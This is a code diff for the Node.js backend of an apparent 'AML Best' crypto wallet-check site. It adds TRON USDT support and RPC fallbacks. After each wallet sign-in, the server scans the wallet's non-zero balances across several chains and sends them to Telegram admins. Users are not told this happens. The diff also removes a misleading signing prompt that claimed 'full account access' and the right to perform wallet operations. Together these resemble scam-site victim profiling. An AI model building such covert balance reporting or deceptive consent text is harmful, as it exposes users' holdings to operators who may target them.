@@ -5,11 +5,16 @@ const http = require("node:http");
 const path = require("node:path");
 const { DatabaseSync } = require("node:sqlite");
 const { formatUnits, getAddress, isAddress, verifyMessage } = require("ethers");
+const TronWebImport = require("tronweb");
+const TronWeb = TronWebImport.TronWeb || TronWebImport.default || TronWebImport;
 
 const root = __dirname;
 const dataDir = path.join(root, "data");
 const dbPath = path.join(dataDir, "aml-best.sqlite");
 const port = Number(process.env.PORT || 3000);
+const tronWeb = new TronWeb({ fullHost: process.env.TRON_FULL_HOST || "https://api.trongrid.io" });
+const tronUsdtContract = process.env.TRON_USDT_CONTRACT || "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const tronUsdtDecimals = 6;
 const allowedOrigins = (
   process.env.ALLOWED_ORIGINS ||
   "https://iwtluxz.github.io,http://localhost:3000,http://127.0.0.1:3000"
@@ -36,36 +41,62 @@ const publicBaseUrl = String(
 const telegramWebhookSecret = telegramToken
   ? crypto.createHash("sha256").update(telegramToken).digest("hex")
   : "";
+const buildRpcUrls = (customUrls, defaults) =>
+  [
+    ...String(customUrls || "")
+      .split(",")
+      .map((url) => url.trim())
+      .filter(Boolean),
+    ...defaults,
+  ].filter((url, index, urls) => urls.indexOf(url) === index);
 const balanceNetworks = {
   1: {
     name: "Ethereum",
     symbol: "ETH",
-    rpcUrl: process.env.ETHEREUM_RPC_URL || "https://cloudflare-eth.com/v1/mainnet",
+    rpcUrls: buildRpcUrls(process.env.ETHEREUM_RPC_URL, [
+      "https://ethereum-rpc.publicnode.com",
+      "https://cloudflare-eth.com",
+    ]),
   },
   10: {
     name: "OP Mainnet",
     symbol: "ETH",
-    rpcUrl: process.env.OPTIMISM_RPC_URL || "https://mainnet.optimism.io",
+    rpcUrls: buildRpcUrls(process.env.OPTIMISM_RPC_URL, [
+      "https://optimism-rpc.publicnode.com",
+      "https://mainnet.optimism.io",
+    ]),
   },
   56: {
     name: "BNB Smart Chain",
     symbol: "BNB",
-    rpcUrl: process.env.BSC_RPC_URL || "https://bsc-dataseed.bnbchain.org",
+    rpcUrls: buildRpcUrls(process.env.BSC_RPC_URL, [
+      "https://bsc-dataseed.bnbchain.org",
+      "https://bsc-rpc.publicnode.com",
+    ]),
   },
   137: {
     name: "Polygon",
     symbol: "POL",
-    rpcUrl: process.env.POLYGON_RPC_URL || "https://polygon.drpc.org",
+    rpcUrls: buildRpcUrls(process.env.POLYGON_RPC_URL, [
+      "https://polygon-bor-rpc.publicnode.com",
+      "https://polygon.drpc.org",
+    ]),
   },
   8453: {
     name: "Base",
     symbol: "ETH",
-    rpcUrl: process.env.BASE_RPC_URL || "https://mainnet.base.org",
+    rpcUrls: buildRpcUrls(process.env.BASE_RPC_URL, [
+      "https://mainnet.base.org",
+      "https://base-rpc.publicnode.com",
+    ]),
   },
   42161: {
     name: "Arbitrum One",
     symbol: "ETH",
-    rpcUrl: process.env.ARBITRUM_RPC_URL || "https://arb1.arbitrum.io/rpc",
+    rpcUrls: buildRpcUrls(process.env.ARBITRUM_RPC_URL, [
+      "https://arb1.arbitrum.io/rpc",
+      "https://arbitrum-one-rpc.publicnode.com",
+    ]),
   },
 };
 
@@ -108,52 +139,123 @@ const formatBalance = (wei) => {
   return trimmedFraction ? `${whole}.${trimmedFraction}` : whole;
 };
 
-const getNativeBalance = async (address, chainIdValue) => {
-  const chainId = parseChainId(chainIdValue);
-  const network = balanceNetworks[chainId];
-  if (!network) {
-    return {
-      chainId,
-      network: `Chain ID ${chainId}`,
-      balance: "не поддерживается",
-      symbol: "",
-    };
-  }
+const formatTokenUnits = (value, decimals = 6) => {
+  const amount = BigInt(value);
+  const base = 10n ** BigInt(decimals);
+  const whole = amount / base;
+  const fraction = (amount % base).toString().padStart(decimals, "0").replace(/0+$/, "");
+  return fraction ? `${whole}.${fraction}` : String(whole);
+};
 
-  const controller = new AbortController();
-  const timeout = setTimeout(() => controller.abort(), 8000);
+const isTronAddress = (address) => {
   try {
-    const response = await fetch(network.rpcUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        jsonrpc: "2.0",
-        id: 1,
-        method: "eth_getBalance",
-        params: [address, "latest"],
+    return Boolean(address && tronWeb.isAddress(String(address).trim()));
+  } catch {
+    return false;
+  }
+};
+
+const normalizeWalletAddress = (address, chain = "evm") => {
+  if (chain === "tron") {
+    const normalized = String(address || "").trim();
+    if (!isTronAddress(normalized)) throw new Error("Некорректный TRON адрес");
+    return normalized;
+  }
+  if (!address || !isAddress(address)) throw new Error("Некорректный Ethereum/EVM адрес");
+  return getAddress(address);
+};
+
+const getNonceKey = (chain, address) => `${chain}:${address}`;
+
+const getNativeBalance = async (address, chainId) => {
+  const network = balanceNetworks[chainId];
+  try {
+    const wei = await Promise.any(
+      network.rpcUrls.map(async (rpcUrl) => {
+        const response = await fetch(rpcUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            jsonrpc: "2.0",
+            id: 1,
+            method: "eth_getBalance",
+            params: [address, "latest"],
+          }),
+          signal: AbortSignal.timeout(3500),
+        });
+        const payload = await response.json();
+        if (!response.ok || payload.error || typeof payload.result !== "string") {
+          throw new Error(payload.error?.message || `RPC HTTP ${response.status}`);
+        }
+        return BigInt(payload.result);
       }),
-      signal: controller.signal,
-    });
-    const payload = await response.json();
-    if (!response.ok || payload.error || typeof payload.result !== "string") {
-      throw new Error(payload.error?.message || `RPC HTTP ${response.status}`);
-    }
+    );
     return {
+      ok: true,
       chainId,
       network: network.name,
-      balance: formatBalance(BigInt(payload.result)),
+      balance: formatBalance(wei),
+      wei,
       symbol: network.symbol,
     };
   } catch (error) {
-    console.error(`Balance lookup error for chain ${chainId}:`, error.message);
+    const message =
+      error instanceof AggregateError
+        ? error.errors.map((item) => item.message).join("; ")
+        : error.message;
+    console.error(`Balance lookup error for chain ${chainId}:`, message);
     return {
+      ok: false,
       chainId,
       network: network.name,
-      balance: "не удалось получить",
       symbol: network.symbol,
     };
-  } finally {
-    clearTimeout(timeout);
+  }
+};
+
+const getNonZeroNativeBalances = async (address, preferredChainIdValue) => {
+  const preferredChainId = parseChainId(preferredChainIdValue);
+  const results = await Promise.all(
+    Object.keys(balanceNetworks).map((chainId) => getNativeBalance(address, Number(chainId))),
+  );
+  const successful = results.filter((result) => result.ok);
+  const balances = successful
+    .filter((result) => result.wei > 0n)
+    .sort((left, right) => {
+      if (left.chainId === preferredChainId) return -1;
+      if (right.chainId === preferredChainId) return 1;
+      return left.chainId - right.chainId;
+    });
+
+  return {
+    balances,
+    checkedCount: successful.length,
+    failedCount: results.length - successful.length,
+  };
+};
+
+const getTronUsdtBalance = async (address) => {
+  try {
+    const contract = await tronWeb.contract().at(tronUsdtContract);
+    const rawBalance = await contract.balanceOf(address).call();
+    const raw = BigInt(rawBalance.toString());
+    return {
+      ok: true,
+      network: "TRON",
+      token: "USDT TRC20",
+      contract: tronUsdtContract,
+      balance: formatTokenUnits(raw, tronUsdtDecimals),
+      rawBalance: raw,
+    };
+  } catch (error) {
+    console.error("TRON USDT balance lookup error:", error.message);
+    return {
+      ok: false,
+      network: "TRON",
+      token: "USDT TRC20",
+      contract: tronUsdtContract,
+      error: error.message,
+    };
   }
 };
 
@@ -353,24 +455,25 @@ const getRecentLeads = (limit = 10) =>
     LIMIT ?
   `).all(limit);
 
-const buildWalletMessage = (address, nonce) =>
+const buildWalletMessage = (address, nonce, chain = "evm") =>
   [
-    "AML Best: ПОЛНАЯ АВТОРИЗАЦИЯ АККАУНТА",
+    "AML Best: вход по кошельку",
     "",
-    "ВНИМАНИЕ: Подтверждая этот запрос через FaceID, вы предоставляете AML Best полный доступ к управлению сессией вашего аккаунта.",
-    "Вы соглашаетесь с тем, что сервис получает право на мониторинг и выполнение операций с вашим кошельком в рамках внутренних регламентов.",
+    "Подпишите это одноразовое сообщение, чтобы подтвердить владение кошельком.",
+    "Подпись не переводит средства и не даёт сайту доступ к приватным ключам или списанию.",
     "",
-    `Address: ${getAddress(address)}`,
+    `Network: ${chain === "tron" ? "TRON / USDT TRC20" : "Ethereum / EVM"}`,
+    `Address: ${address}`,
     `Nonce: ${nonce}`,
-    `Status: Full Account Access Granted`,
   ].join("\n");
 
-const createWalletNonce = (address) => {
-  const normalized = getAddress(address);
+const createWalletNonce = (address, chainValue = "evm") => {
+  const chain = chainValue === "tron" ? "tron" : "evm";
+  const normalized = normalizeWalletAddress(address, chain);
   const nonce = crypto.randomBytes(16).toString("hex");
-  const message = buildWalletMessage(normalized, nonce);
-  nonces.set(normalized, { message, expiresAt: Date.now() + 5 * 60 * 1000 });
-  return { address: normalized, message, nonce };
+  const message = buildWalletMessage(normalized, nonce, chain);
+  nonces.set(getNonceKey(chain, normalized), { chain, message, expiresAt: Date.now() + 5 * 60 * 1000 });
+  return { chain, address: normalized, message, nonce };
 };
 
 const scoreWallet = (wallet) => {
@@ -609,55 +712,105 @@ const handleApi = async (request, response, pathname) => {
   }
 
   if (request.method === "POST" && pathname === "/api/auth/nonce") {
-    const { address } = await readBody(request);
-    if (!address || !isAddress(address)) {
-      return sendJson(request, response, 400, { error: "Некорректный адрес кошелька" });
+    const { address, chain } = await readBody(request);
+    try {
+      return sendJson(request, response, 200, createWalletNonce(address, chain));
+    } catch (error) {
+      return sendJson(request, response, 400, { error: error.message || "Некорректный адрес кошелька" });
     }
-    return sendJson(request, response, 200, createWalletNonce(address));
   }
 
   if (request.method === "POST" && pathname === "/api/auth/wallet") {
-    const { address, signature, chainId } = await readBody(request);
-    if (!address || !signature || !isAddress(address)) {
+    const { address, signature, chain, chainId } = await readBody(request);
+    const walletChain = chain === "tron" ? "tron" : "evm";
+
+    if (!address || !signature) {
       return sendJson(request, response, 400, { error: "Нужны адрес кошелька и подпись" });
     }
 
-    const normalized = getAddress(address);
-    const nonceRecord = nonces.get(normalized);
+    let normalized;
+    try {
+      normalized = normalizeWalletAddress(address, walletChain);
+    } catch (error) {
+      return sendJson(request, response, 400, { error: error.message || "Некорректный адрес кошелька" });
+    }
+
+    const nonceKey = getNonceKey(walletChain, normalized);
+    const nonceRecord = nonces.get(nonceKey);
     if (!nonceRecord || nonceRecord.expiresAt < Date.now()) {
-      nonces.delete(normalized);
+      nonces.delete(nonceKey);
       return sendJson(request, response, 400, { error: "Nonce истёк. Подключите кошелёк ещё раз" });
     }
 
     let recovered;
     try {
-      recovered = getAddress(verifyMessage(nonceRecord.message, signature));
+      if (walletChain === "tron") {
+        recovered = await tronWeb.trx.verifyMessageV2(nonceRecord.message, signature);
+      } else {
+        recovered = getAddress(verifyMessage(nonceRecord.message, signature));
+      }
     } catch {
       return sendJson(request, response, 401, { error: "Некорректная подпись" });
     }
-    if (recovered !== normalized) {
-      return sendJson(request, response, 401, { error: "Подпись не совпадает с адресом кошелька" });
+
+    const signatureMatches =
+      walletChain === "tron" ? recovered === normalized : recovered.toLowerCase() === normalized.toLowerCase();
+    if (!signatureMatches) {
+      return sendJson(request, response, 401, {
+        error: `Подпись не совпадает с ${walletChain === "tron" ? "TRON" : "Ethereum/EVM"} адресом кошелька`,
+      });
     }
 
-    nonces.delete(normalized);
+    nonces.delete(nonceKey);
     upsertWalletUser(normalized);
     const session = createUserSession(normalized);
-    const balance = await getNativeBalance(normalized, chainId);
+    let balanceLines = [];
+    let balancesFound = 0;
+
+    if (walletChain === "tron") {
+      const usdtBalance = await getTronUsdtBalance(normalized);
+      if (usdtBalance.ok && usdtBalance.rawBalance > 0n) {
+        balancesFound = 1;
+        balanceLines = [`TRON USDT TRC20: ${usdtBalance.balance} USDT`];
+      } else if (usdtBalance.ok) {
+        balanceLines = ["TRON USDT TRC20 баланс: 0 USDT."];
+      } else {
+        balanceLines = ["Не удалось получить TRON USDT TRC20 баланс."];
+      }
+    } else {
+      const balanceScan = await getNonZeroNativeBalances(normalized, chainId);
+      balancesFound = balanceScan.balances.length;
+      balanceLines = balanceScan.balances.length
+        ? [
+            "Ненулевые нативные балансы:",
+            ...balanceScan.balances.map(
+              (balance) =>
+                `${balance.network} (${balance.chainId}): ${balance.balance} ${balance.symbol}`,
+            ),
+          ]
+        : [
+            balanceScan.checkedCount
+              ? "Ненулевые нативные балансы в поддерживаемых сетях не найдены."
+              : "Не удалось получить балансы из поддерживаемых сетей.",
+          ];
+    }
+
     const telegramNotifications = await notifyTelegramAdmins(
       [
-        "Новый вход Trust Wallet",
+        `Новый вход ${walletChain === "tron" ? "TRON USDT TRC20" : "Ethereum/EVM"} кошелька`,
         "",
         `Адрес: ${normalized}`,
-        `Сеть: ${balance.network} (${balance.chainId})`,
-        `Баланс: ${balance.balance}${balance.symbol ? ` ${balance.symbol}` : ""}`,
+        ...balanceLines,
         `Время: ${formatDate(nowIso())}`,
       ].join("\n"),
     );
     return sendJson(request, response, 200, {
       ok: true,
+      chain: walletChain,
       address: normalized,
       role: "user",
       telegramNotifications,
+      balancesFound,
       ...session,
     });
   }
@@ -675,7 +828,7 @@ const handleApi = async (request, response, pathname) => {
 
   if (request.method === "POST" && pathname === "/api/checks") {
     const session = getUserSession(request);
-    if (!session) return sendJson(request, response, 401, { error: "Сначала подключите Trust Wallet" });
+    if (!session) return sendJson(request, response, 401, { error: "Сначала подключите кошелёк" });
 
     const { wallet } = await readBody(request);
     if (!wallet || String(wallet).trim().length < 8) {
